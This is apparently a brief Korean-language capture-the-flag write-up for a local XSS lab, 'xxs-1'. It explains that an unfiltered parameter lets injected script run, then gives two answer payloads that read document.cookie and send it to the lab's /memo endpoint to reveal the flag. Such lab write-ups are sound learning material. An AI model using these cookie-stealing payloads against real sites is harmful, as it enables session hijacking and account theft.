# xxs-1

    flag는 서버내에서 보내는 아래 HTTP요청의 쿠키 값임.
    
    memo는 요청 URL파라미터 값을 출력함.
    /memo?memo=hello
    서버의 변수를 URL요청에 담아서 값을 확인할 수 있음.

- 서버에 요청을 보낼 수 있는 기능이 있음.
    - http://127.0.0.1:8000/xxs?xxs=[입력]   
- '입력' 에 코드를 넣으면 xss필터링 없이 서버로 요청을 보냄.
- 서버안에서 '/memo?memo=쿠키값' 이렇게 보내야 쿠키값이 memo에 찍힘    
    >답1: \<script>new Image.src="/memo?memo="+document.cookie;\</script>   
    >답2: \<script>document.location.href="/memo?memo="+document.cookie;\</script>

- 스크립트를 넣어서 요청을 보내기만 하면 됨.